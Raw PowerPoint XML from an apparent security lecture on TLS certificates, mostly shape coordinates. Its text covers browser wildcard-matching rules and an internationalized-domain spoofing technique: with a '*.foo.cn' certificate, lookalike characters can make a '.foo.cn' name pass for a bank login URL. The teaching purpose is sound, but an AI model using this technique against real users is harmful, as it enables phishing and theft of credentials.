                  <a:lnTo>
                    <a:pt x="63377" y="271048"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="110781" y="235606"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="170143" y="201885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="240754" y="170079"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280057" y="154954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="321906" y="140381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="366214" y="126384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="412891" y="112987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="461849" y="100214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="512999" y="88089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="566253" y="76637"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="621523" y="65882"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="678719" y="55848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="737753" y="46559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="798536" y="38040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="860980" y="30315"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="924997" y="23407"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="990498" y="17343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1057393" y="12144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1125596" y="7837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1195016" y="4444"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1265566" y="1991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1337156" y="501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1409699" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1482242" y="501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1553833" y="1991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1624383" y="4444"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1693803" y="7837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762005" y="12144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1828901" y="17343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1894401" y="23407"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1958418" y="30315"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2020862" y="38040"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2081646" y="46559"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2140680" y="55848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2197876" y="65882"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2253145" y="76637"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2306399" y="88089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2357549" y="100214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2406507" y="112987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2453184" y="126384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2497492" y="140381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2539341" y="154954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2578644" y="170079"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2615312" y="185730"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2680387" y="218518"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2733859" y="253124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2775018" y="289354"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2803156" y="327014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2817565" y="365911"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2819399" y="385762"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2817565" y="405614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2803156" y="444510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2775018" y="482170"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2733859" y="518401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2680387" y="553006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2615312" y="585794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2578644" y="601446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2539341" y="616570"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2497492" y="631143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2453184" y="645141"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2406507" y="658538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2357549" y="671311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2306399" y="683436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2253145" y="694888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2197876" y="705643"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2140680" y="715677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2081646" y="724966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2020862" y="733485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1958418" y="741210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1894401" y="748117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1828901" y="754182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1762005" y="759380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1693803" y="763688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1624383" y="767080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1553833" y="769534"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1482242" y="771023"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1409699" y="771525"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1337156" y="771023"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1265566" y="769534"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1195016" y="767080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1125596" y="763688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1057393" y="759380"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="990498" y="754182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="924997" y="748117"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="860980" y="741210"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="798536" y="733485"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="737753" y="724966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="678719" y="715677"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="621523" y="705643"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="566253" y="694888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="512999" y="683436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="461849" y="671311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="412891" y="658538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="366214" y="645141"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="321906" y="631143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="280057" y="616570"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="240754" y="601446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="204086" y="585794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="139011" y="553006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="85540" y="518401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="44381" y="482170"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16242" y="444510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1834" y="405614"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="385762"/>
                  </a:lnTo>
                  <a:close/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24286654" name="object 6"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId4"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="133200" y="3276720"/>
            <a:ext cx="3371760" cy="3247920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="593256162" name="object 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="485280" y="2319120"/>
            <a:ext cx="2524320" cy="866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Important</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-13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fields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913594" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="5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4D0BD62-E57A-4CBD-A755-A9FCA8C58EF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0067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Common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Name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8701335" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="5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DBE9D8A7-3688-4318-B711-446485AE1973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39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690921" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1555560"/>
            <a:ext cx="7315560" cy="320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Explicit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name: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www.foo.com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Wildcard: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99"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>*.foo.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="28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99"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>www*.foo.com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41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Matching</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-13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rules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4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Firefox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3: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*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matches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anything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9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Internet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Explorer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7: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*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must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occur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leftmost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component,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does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match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MS PGothic"/>
              </a:rPr>
              <a:t>‘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.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic"/>
              </a:rPr>
              <a:t>’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99"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="749160" algn="l"/>
                <a:tab pos="754920" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-1">
                <a:solidFill>
                  <a:srgbClr val="008080"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>–</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="49">
                <a:solidFill>
                  <a:srgbClr val="00808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*.foo.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-32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matches</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-26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a.foo.com,</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-26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but</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-26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9192"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>not</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-26">
                <a:solidFill>
                  <a:srgbClr val="009192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9192"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>a.b.foo.com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288243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International</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-8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Domain</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-7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Names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5780393" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="5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440A0318-F0B6-4783-90B5-2E07599739CB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0892226" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1555560"/>
            <a:ext cx="8373960" cy="511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Rendered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800" b="0" strike="noStrike" spc="-10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international</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-1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character</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-1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set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75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Chinese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character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set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contains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characters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look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like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/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?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=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05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What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could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go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wrong?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56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buy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*.foo.cn,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create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any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number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domain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names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look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like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04"/>
              </a:spcBef>
              <a:tabLst>
                <a:tab pos="355680" algn="l"/>
              </a:tabLst>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="28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www.bank.com/accounts/login.php?q=me</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>.foo.cn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What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does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user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see?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*.foo.cn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works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all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them!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650077" name="object 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6908760" y="1143000"/>
            <a:ext cx="2158560" cy="369720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 2158560"/>
              <a:gd name="textAreaRight" fmla="*/ 2158920 w 215856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2159000" h="370205" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="2159000" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2159000" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2159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71948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535716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Example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6872218" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6987600" y="1176120"/>
            <a:ext cx="197892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[Moxie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Marlinspike]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8121137" name="object 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1000080" y="1484280"/>
            <a:ext cx="6543360" cy="5297039"/>
            <a:chOff x="1000080" y="1484280"/>
            <a:chExt cx="6543360" cy="5297039"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="518" name="object 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00080" y="1484280"/>
              <a:ext cx="6235200" cy="52210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19" name="object 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3886200" y="6095880"/>
              <a:ext cx="3657240" cy="68544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3657600" h="685800" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="342899"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13552" y="300944"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53149" y="260497"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93233" y="234517"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="143716" y="209427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="204127" y="185317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="273996" y="162274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="312330" y="151181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="352852" y="140387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="395503" y="129905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="440224" y="119744"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="486957" y="109916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="535642" y="100433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="586222" y="91304"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="638636" y="82542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="692826" y="74156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="748734" y="66159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="806300" y="58561"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="865465" y="51374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="926172" y="44607"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="988360" y="38273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1051972" y="32383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1116948" y="26946"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1183229" y="21975"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1250757" y="17481"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1319473" y="13474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1389317" y="9965"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1460232" y="6966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1532158" y="4487"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1605037" y="2541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1678809" y="1136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1753416" y="286"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1828799" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1904182" y="286"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1978789" y="1136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2052561" y="2541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2125440" y="4487"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2197366" y="6966"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2268281" y="9965"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2338125" y="13474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2406841" y="17481"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2474369" y="21975"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2540650" y="26946"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605626" y="32383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2669238" y="38273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2731426" y="44607"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2792132" y="51374"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2851298" y="58561"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2908864" y="66159"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2964772" y="74156"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3018962" y="82542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3071376" y="91304"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3121955" y="100433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3170641" y="109916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3217374" y="119744"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3262095" y="129905"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3304746" y="140387"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3345268" y="151181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3383602" y="162274"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3453471" y="185317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3513882" y="209427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3564365" y="234517"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3604449" y="260497"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3633663" y="287279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3656073" y="328765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3657599" y="342899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3656073" y="357034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3633663" y="398520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3604449" y="425302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3564365" y="451282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3513882" y="476372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3453471" y="500482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3383602" y="523524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3345268" y="534618"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3304746" y="545412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3262095" y="555894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3217374" y="566055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3170641" y="575883"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3121955" y="585366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3071376" y="594495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3018962" y="603257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2964772" y="611642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2908864" y="619640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2851298" y="627237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2792132" y="634425"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2731426" y="641191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2669238" y="647525"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2605626" y="653416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2540650" y="658853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2474369" y="663824"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2406841" y="668318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2338125" y="672325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2268281" y="675834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2197366" y="678833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2125440" y="681311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2052561" y="683258"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1978789" y="684663"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1904182" y="685513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1828799" y="685799"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1753416" y="685513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1678809" y="684663"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1605037" y="683258"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1532158" y="681311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1460232" y="678833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1389317" y="675834"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1319473" y="672325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1250757" y="668318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1183229" y="663824"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1116948" y="658853"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1051972" y="653416"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="988360" y="647525"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="926172" y="641191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="865465" y="634425"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="806300" y="627237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="748734" y="619640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="692826" y="611642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="638636" y="603257"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="586222" y="594495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="535642" y="585366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="486957" y="575883"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="440224" y="566055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="395503" y="555894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="352852" y="545412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="312330" y="534618"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="273996" y="523524"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="204127" y="500482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="143716" y="476372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="93233" y="451282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="53149" y="425302"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="23935" y="398520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1525" y="357034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="342899"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="38099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56964617" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="5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25305F82-E8B5-40BF-9326-ADCE1B4E21A8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768284" name="object 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7253280" y="1143000"/>
            <a:ext cx="1204920" cy="369720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 1204920"/>
              <a:gd name="textAreaRight" fmla="*/ 1205280 w 120492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1205229" h="370205" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="1204911" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1204911" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="120491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10660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Meaning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of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Color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360369" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7332120" y="1176120"/>
            <a:ext cx="10389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[Schultze]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5040750" name="object 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="453960" y="1514520"/>
            <a:ext cx="5108760" cy="5133600"/>
            <a:chOff x="453960" y="1514520"/>
            <a:chExt cx="5108760" cy="5133600"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="525" name="object 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453960" y="1514520"/>
              <a:ext cx="4790880" cy="5133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26" name="object 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
